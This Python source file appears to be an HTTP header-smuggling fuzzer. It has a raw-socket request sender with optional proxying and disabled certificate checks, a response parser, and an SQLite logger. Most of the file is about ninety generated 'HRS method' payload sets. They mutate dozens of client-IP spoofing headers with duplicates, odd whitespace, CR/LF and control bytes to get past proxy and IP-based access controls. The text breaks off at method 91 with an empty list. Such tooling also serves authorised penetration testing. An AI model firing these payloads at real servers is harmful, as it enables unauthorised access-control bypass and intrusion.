import socket
import ssl

import sqlite3
import json

from urllib.parse import urlparse


def raw_http_request(host, port=443, method="GET", path="/", proxy=None,
                     insecure=False, headers=None, raw_headers=None,
                     body=None, recv_buf=4096, timeout=None):
    """
    Send a raw HTTP/HTTPS request using sockets, with optional proxy, insecure SSL,
    verbatim raw headers, and optional request body.

    Parameters
    ----------
    host : str
        Target hostname.
    port : int
        Port to connect to (80 for HTTP, 443 for HTTPS).
    method : str
        HTTP method (e.g., "GET", "POST", "PUT", "PATCH").
    path : str
        Request path (may include query parameters).
    proxy : tuple or None
        Optional proxy (host, port). If None, connects directly.
    insecure : bool
        If True, disables SSL certificate verification.
    headers : dict or None
        Additional headers to append after raw_headers.
    raw_headers : str or None
        Verbatim headers to include immediately after the request line. Ideal for HRS payload.
    body : str or bytes or None
        Request body. If given, Content-Length will be added automatically
        for POST, PUT, PATCH unless already present.
    recv_buf : int
        Buffer size for each recv() call.
    timeout : float or None
        Socket timeout in seconds.

    Returns
    -------
    tuple
        (raw_request_bytes, raw_request_escaped, raw_response_bytes, raw_response_escaped)

    Notes
    -----
    - raw_headers is sent exactly as provided (no normalization).
    - Host and Connection headers are added automatically if missing.
    - Content-Length is auto-added for POST/PUT/PATCH if a body is present.
    - Returns both raw bytes and printable escaped versions showing `\r` and `\n`.
    """

    headers = {} if headers is None else dict(headers)

    target_host, target_port = proxy if proxy else (host, port)

    af, socktype, proto, _, sa = socket.getaddrinfo(target_host, target_port, 0, socket.SOCK_STREAM)[0]
    sock = socket.socket(af, socktype, proto)
    if timeout is not None:
        sock.settimeout(timeout)
    sock.connect(sa)

    # If HTTPS via proxy, CONNECT first
    if port == 443 and proxy:
        connect_request = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        sock.send(connect_request.encode())
        resp = sock.recv(recv_buf)
        if b"200 Connection established" not in resp and b"200 OK" not in resp:
            sock.close()
            raise Exception("Proxy CONNECT failed:\n" + resp.decode(errors="ignore"))

    # Wrap with SSL for HTTPS
    if port == 443:
        context = ssl.create_default_context()
        if insecure:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        s = context.wrap_socket(sock, server_hostname=host)
    else:
        s = sock

    # Request line
    url_prefix = f"http://{host}" if proxy and port != 443 else ""
    request_line = f"{method} {url_prefix}{path} HTTP/1.1\r\n"
    request_line_bytes = request_line.encode('latin-1')

    # Check if Host is already provided in raw_headers or dict headers
    raw_contains_host = False
    if raw_headers:
        for line in raw_headers.splitlines():
            if line.lower().startswith("host:"):
                raw_contains_host = True
                break
    user_provided_host = any(k.lower() == "host" for k in headers.keys())
    if not raw_contains_host and not user_provided_host:
        headers.setdefault('Host', host)

    # Default Connection header if not provided by user
    if not any(k.lower() == "connection" for k in headers.keys()):
        headers.setdefault('Connection', 'close')

    # Handle Content-Length for methods with body
    if method.upper() in ("POST", "PUT", "PATCH") and body is not None:
        if not any(k.lower() == "content-length" for k in headers.keys()):
            body_bytes = body.encode('latin-1') if isinstance(body, str) else body
            headers["Content-Length"] = str(len(body_bytes))
    else:
        body_bytes = b"" if body is None else (body.encode('latin-1') if isinstance(body, str) else body)

    # Build header bytes from dict (safe: strip CR/LF from dict values)
    header_lines_bytes = b""
    for name, value in headers.items():
        if isinstance(value, (list, tuple)):
            header_value = ", ".join(str(v) for v in value)
        else:
            header_value = str(value)
        header_value = header_value.replace('\r', '').replace('\n', '')
        line = f"{name}: {header_value}\r\n"
        header_lines_bytes += line.encode('latin-1')

    # raw_headers_bytes: verbatim as provided
    raw_headers_bytes = raw_headers.encode('latin-1') if raw_headers else b""

    # Assemble request
    parts = [request_line_bytes]

    if raw_headers_bytes:
        parts.append(raw_headers_bytes)
        if raw_headers_bytes.endswith(b'\r\n\r\n'):
            parts.append(header_lines_bytes)
        else:
            parts.append(b'\r\n')
            parts.append(header_lines_bytes)
            parts.append(b'\r\n')
    else:
        parts.append(header_lines_bytes)
        parts.append(b'\r\n')

    parts.append(body_bytes)
    raw_request_bytes = b"".join(parts)

    # Send
    s.send(raw_request_bytes)

    # Receive response
    raw_response_bytes = b""
    try:
        while True:
            chunk = s.recv(recv_buf)
            if not chunk:
                break
            raw_response_bytes += chunk
    finally:
        s.close()

    # Escaped printable forms
    def escape_bytes(b: bytes) -> str:
        s = b.decode('latin-1', errors="replace")
        return s.replace('\r', '\\r').replace('\n', '\\n')

    raw_request_escaped = escape_bytes(raw_request_bytes)
    raw_response_escaped = escape_bytes(raw_response_bytes)

    return raw_request_bytes, raw_request_escaped, raw_response_bytes, raw_response_escaped


def parse_raw_http_response(raw_response: bytes):
    """
    Parse a raw HTTP response into status code, headers dict, and body.

    Parameters
    ----------
    raw_response : bytes
        Raw HTTP response bytes as received from the socket.

    Returns
    -------
    tuple
        (status_code: int, headers: dict, body: bytes)
        - status_code: HTTP status code (e.g., 200, 404)
        - headers: dict of header names (lowercased) to values
        - body: raw response body as bytes
    """
    # Decode headers safely (latin-1 preserves all bytes)
    decoded = raw_response.decode('latin-1', errors='replace')

    # Split headers and body on the first CRLFCRLF sequence
    parts = decoded.split("\r\n\r\n", 1)
    header_block = parts[0]
    body = parts[1].encode('latin-1') if len(parts) > 1 else b""

    # Split status line and header lines
    lines = header_block.split("\r\n")
    status_line = lines[0] if lines else ""
    header_lines = lines[1:]

    # Parse status code
    try:
        status_code = int(status_line.split()[1])
    except (IndexError, ValueError):
        status_code = None

    # Parse headers into dict (lowercased keys for convenience)
    headers = {}
    for line in header_lines:
        if ':' in line:
            name, value = line.split(':', 1)
            headers[name.strip().lower()] = value.strip()

    return status_code, headers, body


def store_http_response(response_code, response_headers, response_body, url=None, payload=None, table_name="http_responses"):
    """
    Store HTTP response details into SQLite database `responses.db`.

    Parameters
    ----------
    response_code : int
        HTTP status code.
    response_headers : dict
        HTTP response headers.
    response_body : str
        HTTP response body.
    url : str, optional
        The requested URL (default None).
    payload : str, optional
        The payload or character inserted in URL, if any (default None).
    table_name : str
        Name of the SQLite table. Defaults to "http_responses".

    Notes
    -----
    - Database file is always created as "responses.db".
    - Table name can be customized per function call.
    - Headers are stored as JSON.
    """
    db_path = "responses.db"
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    cursor.execute(f"""
        CREATE TABLE IF NOT EXISTS {table_name} (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            payload TEXT,
            status_code INTEGER,
            headers TEXT,
            body TEXT
        )
    """)

    cursor.execute(f"""
        INSERT INTO {table_name} (url, payload, status_code, headers, body)
        VALUES (?, ?, ?, ?, ?)
    """, (
        url,
        payload,
        response_code,
        json.dumps(response_headers),
        response_body
    ))

    conn.commit()
    conn.close()


ip_headers = ["X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "X-Host", "X-Forwared-Host", "X-Forwarded", "Forwarded-For", "Cluster-Client-IP", "Fastly-Client-IP", "X-Cluster-Client-IP", "CACHE_INFO", "CF_CONNECTING_IP", "CF-Connecting-IP", "CLIENT_IP", "Client-IP", "COMING_FROM", "CONNECT_VIA_IP", "FORWARD_FOR", "FORWARD-FOR", "FORWARDED_FOR_IP", "FORWARDED_FOR", "FORWARDED-FOR-IP", "FORWARDED-FOR", "FORWARDED", "HTTP-CLIENT-IP", "HTTP-FORWARDED-FOR-IP", "HTTP-PC-REMOTE-ADDR", "HTTP-PROXY-CONNECTION", "HTTP-VIA", "HTTP-X-FORWARDED-FOR-IP", "HTTP-X-IMFORWARDS", "HTTP-XROXY-CONNECTION", "PC_REMOTE_ADDR", "PRAGMA", "PROXY_AUTHORIZATION", "PROXY_CONNECTION", "Proxy-Client-IP", "PROXY", "REMOTE_ADDR", "Source-IP", "True-Client-IP", "Via", "VIA", "WL-Proxy-Client-IP", "X_CLUSTER_CLIENT_IP", "X_COMING_FROM", "X_DELEGATE_REMOTE_HOST", "X_FORWARDED_FOR_IP", "X_FORWARDED_FOR", "X_FORWARDED", "X_IMFORWARDS", "X_LOCKING", "X_LOOKING", "X_REAL_IP", "X-Backend-Host", "X-BlueCoat-Via", "X-Cache-Info", "X-Forward-For", "X-Forwarded-By", "X-Forwarded-For-Original", "X-Forwarded-For", "X-Forwarded-For", "X-Forwarded-Server", "X-Forwarded-Host", "X-From-IP", "X-From", "X-Gateway-Host", "X-Host", "X-Ip", "X-Original-Host", "X-Original-IP", "X-Original-Remote-Addr", "X-Original-Url", "X-Originally-Forwarded-For", "X-Originating-IP", "X-ProxyMesh-IP", "X-ProxyUser-IP", "X-Real-IP", "X-Remote-Addr", "X-Remote-IP", "X-True-Client-IP", "XONNECTION", "XPROXY", "XROXY_CONNECTION", "Z-Forwarded-For", "ZCACHE_CONTROL"]
# in ip_header_values list provide the IP(s) to use for the spoofing header — if you supply multiple IPs, the script will send a separate request for each IP.
ip_header_values = ["127.0.0.1", "23.215.0.136"]

# HRS method 1: adding ip spoofing header
mutation_headers1 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers1.append(f"{ip_header}: {ip_header_value}")

# HRS method 2: adding same ip spoofing header twice
mutation_headers2 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers2.append(f"{ip_header}: {ip_header_value}\r\n{ip_header}: {ip_header_value}")

# HRS method 3: using letter "z" as spoofed IP header value. E.g. X-Forwarded-For: z
mutation_headers3 = []
for ip_header in ip_headers:
    mutation_headers3.append(f"{ip_header}: z")

# HRS method 4: space before colon. E.g. X-Forwarded-For : 127.0.0.1
mutation_headers4 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers4.append(f"{ip_header} : {ip_header_value}")

# HRS method 5: first header normal, second header with the value "x". E.g.
# X-Forwarded-For: 127.0.0.1
# X-Forwarded-For: x
mutation_headers5 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers5.append(f"{ip_header}: {ip_header_value}\r\n{ip_header}: x")

# HRS method 6: Space before header name and right after request line. E.g.
# `GET / HTTP/1.1`
# ` X-Forwarded-For: 127.0.0.1`
mutation_headers6 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers6.append(f" {ip_header}: {ip_header_value}")

# HRS method 7: split header name and value across two lines, with the new line starting with a space.
# `X-Forwarded-For`
# ` : 127.0.0.1`
mutation_headers7 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers7.append(f"{ip_header}\r\n : {ip_header_value}")

# HRS method 8: Tab before header value. E.g. `X-Forwarded-For:     127.0.0.1`
mutation_headers8 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers8.append(f"{ip_header}:\t{ip_header_value}")

# HRS method 9: A fake header followed by a newline and a real IP spoofing header. E.g. `X: X[\n]X-Forwarded-For: 127.0.0.1`
mutation_headers9 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers9.append(f"""X: X\n{ip_header}: {ip_header_value}""")

# HRS method 10: Header name Junk. E.g.: `X-Forwarded-For abcd: 127.0.0.1`
mutation_headers10 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers10.append(f"{ip_header} abcd: {ip_header_value}")

# HRS method 11: Turn hypes to underscores in header name. E.g. `X_Forwarded_For: 127.0.0.1`
mutation_headers11 = []
for ip_header in ip_headers:
    ip_header = ip_header.replace("-", "_")
    for ip_header_value in ip_header_values:
        mutation_headers11.append(f"{ip_header}: {ip_header_value}")

# HRS method 12: Turn hypes to underscores in header name and add that header twice. E.g.
# `X_Forwarded_For: 127.0.0.1`
# `X_Forwarded_For: 127.0.0.1`
mutation_headers12 = []
for ip_header in ip_headers:
    ip_header = ip_header.replace("-", "_")
    for ip_header_value in ip_header_values:
        mutation_headers12.append(f"{ip_header}: {ip_header_value}\r\n{ip_header}: {ip_header_value}")

# HRS method 13: Carriage return before header name. E.g. [\r]X-Forwarded-For: 127.0.0.1
mutation_headers13 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers13.append(f"\r{ip_header}: {ip_header_value}")

# HRS method 14: Tab before header name. E.g. `     X-Forwarded-For: 127.0.0.1`
mutation_headers14 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers14.append(f"\t{ip_header}: {ip_header_value}")

# HRS method 15: A fake header followed by carriage return line feed and a carriage return, and then a real IP spoofing header. E.g.
# `Foo: bar\r\n`
# `\rX-Forwarded-For: 127.0.0.1`
mutation_headers15 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers15.append(f"Foo: bar\r\n\r{ip_header}: {ip_header_value}")
# ---------------------------------------------------------------------------------------------------

# HRS method 16: E.g. `\x00X-Forwarded-For: 127.0.0.1`
mutation_headers16 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers16.append(f"\x00{ip_header}: {ip_header_value}")

# HRS method 17: E.g. `X-Forwarded-For\x00: 127.0.0.1`
mutation_headers17 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers17.append(f"{ip_header}\x00: {ip_header_value}")

# HRS method 18: E.g. `X-Forwarded-For:\x00127.0.0.1`
mutation_headers18 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers18.append(f"{ip_header}:\x00{ip_header_value}")

# HRS method 19: E.g. `X-Forwarded-For: \x00127.0.0.1`
mutation_headers19 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers19.append(f"{ip_header}: \x00{ip_header_value}")

# HRS method 20: E.g. `X-Forwarded-For: 127.0.0.1\x00`
mutation_headers20 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers20.append(f"{ip_header}: {ip_header_value}\x00")
# ------------------------------------------------------------------------------------------------

# HRS method 21: E.g. `\x01X-Forwarded-For: 127.0.0.1`
mutation_headers21 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers21.append(f"\x01{ip_header}: {ip_header_value}")

# HRS method 22: E.g. `X-Forwarded-For\x01: 127.0.0.1`
mutation_headers22 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers22.append(f"{ip_header}\x01: {ip_header_value}")

# HRS method 23: E.g. `X-Forwarded-For:\x01127.0.0.1`
mutation_headers23 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers23.append(f"{ip_header}:\x01{ip_header_value}")

# HRS method 24: E.g. `X-Forwarded-For: \x01127.0.0.1`
mutation_headers24 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers24.append(f"{ip_header}: \x01{ip_header_value}")

# HRS method 25: E.g. `X-Forwarded-For: 127.0.0.1\x01`
mutation_headers25 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers25.append(f"{ip_header}: {ip_header_value}\x01")
# ---------------------------------------------------------------------------------------------------

# HRS method 26: E.g. `\x02X-Forwarded-For: 127.0.0.1`
mutation_headers26 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers26.append(f"\x02{ip_header}: {ip_header_value}")

# HRS method 27: E.g. `X-Forwarded-For\x02: 127.0.0.1`
mutation_headers27 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers27.append(f"{ip_header}\x02: {ip_header_value}")

# HRS method 28: E.g. `X-Forwarded-For:\x02127.0.0.1`
mutation_headers28 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers28.append(f"{ip_header}:\x02{ip_header_value}")
        
# HRS method 29: E.g. `X-Forwarded-For: \x02127.0.0.1`
mutation_headers29 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers29.append(f"{ip_header}: \x02{ip_header_value}")

# HRS method 30: E.g. `X-Forwarded-For: 127.0.0.1\x02`
mutation_headers30 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers30.append(f"{ip_header}: {ip_header_value}\x02")
# ---------------------------------------------------------------------------------------------------

# HRS method 31: E.g. `\x03X-Forwarded-For: 127.0.0.1`
mutation_headers31 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers31.append(f"\x03{ip_header}: {ip_header_value}")

# HRS method 32: E.g. `X-Forwarded-For\x03: 127.0.0.1`
mutation_headers32 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers32.append(f"{ip_header}\x03: {ip_header_value}")

# HRS method 33: E.g. `X-Forwarded-For:\x03127.0.0.1`
mutation_headers33 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers33.append(f"{ip_header}:\x03{ip_header_value}")

# HRS method 34: E.g. `X-Forwarded-For: \x03127.0.0.1`
mutation_headers34 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers34.append(f"{ip_header}: \x03{ip_header_value}")

# HRS method 35: E.g. `X-Forwarded-For: 127.0.0.1\x03`
mutation_headers35 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers35.append(f"{ip_header}: {ip_header_value}\x03")
# ---------------------------------------------------------------------------------------------------

# HRS method 36: E.g. `\x04X-Forwarded-For: 127.0.0.1`
mutation_headers36 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers36.append(f"\x04{ip_header}: {ip_header_value}")

# HRS method 37: E.g. `X-Forwarded-For\x04: 127.0.0.1`
mutation_headers37 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers37.append(f"{ip_header}\x04: {ip_header_value}")

# HRS method 38: E.g. `X-Forwarded-For:\x04127.0.0.1`
mutation_headers38 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers38.append(f"{ip_header}:\x04{ip_header_value}")

# HRS method 39: E.g. `X-Forwarded-For: \x04127.0.0.1`
mutation_headers39 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers39.append(f"{ip_header}: \x04{ip_header_value}")

# HRS method 40: E.g. `X-Forwarded-For: 127.0.0.1\x04`
mutation_headers40 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers40.append(f"{ip_header}: {ip_header_value}\x04")
# ---------------------------------------------------------------------------------------------------

# HRS method 41: E.g. `\x05X-Forwarded-For: 127.0.0.1`
mutation_headers41 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers41.append(f"\x05{ip_header}: {ip_header_value}")

# HRS method 42: E.g. `X-Forwarded-For\x05: 127.0.0.1`
mutation_headers42 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers42.append(f"{ip_header}\x05: {ip_header_value}")

# HRS method 43: E.g. `X-Forwarded-For:\x05127.0.0.1`
mutation_headers43 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers43.append(f"{ip_header}:\x05{ip_header_value}")

# HRS method 44: E.g. `X-Forwarded-For: \x05127.0.0.1`
mutation_headers44 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers44.append(f"{ip_header}: \x05{ip_header_value}")

# HRS method 45: E.g. `X-Forwarded-For: 127.0.0.1\x05`
mutation_headers45 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers45.append(f"{ip_header}: {ip_header_value}\x05")
# ---------------------------------------------------------------------------------------------------

# HRS method 46: E.g. `\x06X-Forwarded-For: 127.0.0.1`
mutation_headers46 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers46.append(f"\x06{ip_header}: {ip_header_value}")

# HRS method 47: E.g. `X-Forwarded-For\x06: 127.0.0.1`
mutation_headers47 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers47.append(f"{ip_header}\x06: {ip_header_value}")

# HRS method 48: E.g. `X-Forwarded-For:\x06127.0.0.1`
mutation_headers48 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers48.append(f"{ip_header}:\x06{ip_header_value}")

# HRS method 49: E.g. `X-Forwarded-For: \x06127.0.0.1`
mutation_headers49 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers49.append(f"{ip_header}: \x06{ip_header_value}")

# HRS method 50: E.g. `X-Forwarded-For: 127.0.0.1\x06`
mutation_headers50 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers50.append(f"{ip_header}: {ip_header_value}\x06")
# ---------------------------------------------------------------------------------------------------

# HRS method 51: E.g. `\x07X-Forwarded-For: 127.0.0.1`
mutation_headers51 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers51.append(f"\x07{ip_header}: {ip_header_value}")

# HRS method 52: E.g. `X-Forwarded-For\x07: 127.0.0.1`
mutation_headers52 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers52.append(f"{ip_header}\x07: {ip_header_value}")

# HRS method 53: E.g. `X-Forwarded-For:\x07127.0.0.1`
mutation_headers53 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers53.append(f"{ip_header}:\x07{ip_header_value}")

# HRS method 54: E.g. `X-Forwarded-For: \x07127.0.0.1`
mutation_headers54 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers54.append(f"{ip_header}: \x07{ip_header_value}")

# HRS method 55: E.g. `X-Forwarded-For: 127.0.0.1\x07`
mutation_headers55 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers55.append(f"{ip_header}: {ip_header_value}\x07")
# ---------------------------------------------------------------------------------------------------

# HRS method 56: E.g. `\x08X-Forwarded-For: 127.0.0.1`
mutation_headers56 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers56.append(f"\x08{ip_header}: {ip_header_value}")

# HRS method 57: E.g. `X-Forwarded-For\x08: 127.0.0.1`
mutation_headers57 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers57.append(f"{ip_header}\x08: {ip_header_value}")

# HRS method 58: E.g. `X-Forwarded-For:\x08127.0.0.1`
mutation_headers58 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers58.append(f"{ip_header}:\x08{ip_header_value}")

# HRS method 59: E.g. `X-Forwarded-For: \x08127.0.0.1`
mutation_headers59 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers59.append(f"{ip_header}: \x08{ip_header_value}")

# HRS method 60: E.g. `X-Forwarded-For: 127.0.0.1\x08`
mutation_headers60 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers60.append(f"{ip_header}: {ip_header_value}\x08")
# ---------------------------------------------------------------------------------------------------

# HRS method 61: E.g. `\x09X-Forwarded-For: 127.0.0.1`
mutation_headers61 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers61.append(f"\x09{ip_header}: {ip_header_value}")

# HRS method 62: E.g. `X-Forwarded-For\x09: 127.0.0.1`
mutation_headers62 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers62.append(f"{ip_header}\x09: {ip_header_value}")

# HRS method 63: E.g. `X-Forwarded-For:\x09127.0.0.1`
mutation_headers63 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers63.append(f"{ip_header}:\x09{ip_header_value}")

# HRS method 64: E.g. `X-Forwarded-For: \x09127.0.0.1`
mutation_headers64 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers64.append(f"{ip_header}: \x09{ip_header_value}")

# HRS method 65: E.g. `X-Forwarded-For: 127.0.0.1\x09`
mutation_headers65 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers65.append(f"{ip_header}: {ip_header_value}\x09")
# ---------------------------------------------------------------------------------------------------

# HRS method 66: E.g. `\x0AX-Forwarded-For: 127.0.0.1`
mutation_headers66 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers66.append(f"\x0A{ip_header}: {ip_header_value}")

# HRS method 67: E.g. `X-Forwarded-For\x0A: 127.0.0.1`
mutation_headers67 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers67.append(f"{ip_header}\x0A: {ip_header_value}")

# HRS method 68: E.g. `X-Forwarded-For:\x0A127.0.0.1`
mutation_headers68 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers68.append(f"{ip_header}:\x0A{ip_header_value}")

# HRS method 69: E.g. `X-Forwarded-For: \x0A127.0.0.1`
mutation_headers69 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers69.append(f"{ip_header}: \x0A{ip_header_value}")

# HRS method 70: E.g. `X-Forwarded-For: 127.0.0.1\x0A`
mutation_headers70 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers70.append(f"{ip_header}: {ip_header_value}\x0A")
# ---------------------------------------------------------------------------------------------------

# HRS method 71: E.g. `\x0BX-Forwarded-For: 127.0.0.1`
mutation_headers71 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers71.append(f"\x0B{ip_header}: {ip_header_value}")

# HRS method 72: E.g. `X-Forwarded-For\x0B: 127.0.0.1`
mutation_headers72 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers72.append(f"{ip_header}\x0B: {ip_header_value}")

# HRS method 73: E.g. `X-Forwarded-For:\x0B127.0.0.1`
mutation_headers73 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers73.append(f"{ip_header}:\x0B{ip_header_value}")

# HRS method 74: E.g. `X-Forwarded-For: \x0B127.0.0.1`
mutation_headers74 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers74.append(f"{ip_header}: \x0B{ip_header_value}")

# HRS method 75: E.g. `X-Forwarded-For: 127.0.0.1\x0B`
mutation_headers75 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers75.append(f"{ip_header}: {ip_header_value}\x0B")
# ---------------------------------------------------------------------------------------------------

# HRS method 76: E.g. `\x0CX-Forwarded-For: 127.0.0.1`
mutation_headers76 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers76.append(f"\x0C{ip_header}: {ip_header_value}")

# HRS method 77: E.g. `X-Forwarded-For\x0C: 127.0.0.1`
mutation_headers77 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers77.append(f"{ip_header}\x0C: {ip_header_value}")

# HRS method 78: E.g. `X-Forwarded-For:\x0C127.0.0.1`
mutation_headers78 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers78.append(f"{ip_header}:\x0C{ip_header_value}")

# HRS method 79: E.g. `X-Forwarded-For: \x0C127.0.0.1`
mutation_headers79 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers79.append(f"{ip_header}: \x0C{ip_header_value}")

# HRS method 80: E.g. `X-Forwarded-For: 127.0.0.1\x0C`
mutation_headers80 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers80.append(f"{ip_header}: {ip_header_value}\x0C")
# ---------------------------------------------------------------------------------------------------

# HRS method 81: E.g. `\x0DX-Forwarded-For: 127.0.0.1`
mutation_headers81 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers81.append(f"\x0D{ip_header}: {ip_header_value}")

# HRS method 82: E.g. `X-Forwarded-For\x0D: 127.0.0.1`
mutation_headers82 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers82.append(f"{ip_header}\x0D: {ip_header_value}")

# HRS method 83: E.g. `X-Forwarded-For:\x0D127.0.0.1`
mutation_headers83 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers83.append(f"{ip_header}:\x0D{ip_header_value}")

# HRS method 84: E.g. `X-Forwarded-For: \x0D127.0.0.1`
mutation_headers84 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers84.append(f"{ip_header}: \x0D{ip_header_value}")

# HRS method 85: E.g. `X-Forwarded-For: 127.0.0.1\x0D`
mutation_headers85 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers85.append(f"{ip_header}: {ip_header_value}\x0D")
# ---------------------------------------------------------------------------------------------------

# HRS method 86: E.g. `\x0EX-Forwarded-For: 127.0.0.1`
mutation_headers86 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers86.append(f"\x0E{ip_header}: {ip_header_value}")

# HRS method 87: E.g. `X-Forwarded-For\x0E: 127.0.0.1`
mutation_headers87 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers87.append(f"{ip_header}\x0E: {ip_header_value}")

# HRS method 88: E.g. `X-Forwarded-For:\x0E127.0.0.1`
mutation_headers88 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers88.append(f"{ip_header}:\x0E{ip_header_value}")

# HRS method 89: E.g. `X-Forwarded-For: \x0E127.0.0.1`
mutation_headers89 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers89.append(f"{ip_header}: \x0E{ip_header_value}")

# HRS method 90: E.g. `X-Forwarded-For: 127.0.0.1\x0E`
mutation_headers90 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers90.append(f"{ip_header}: {ip_header_value}\x0E")
# ---------------------------------------------------------------------------------------------------

# HRS method 91: E.g. `\x0FX-Forwarded-For: 127.0.0.1`
mutation_headers91 = []
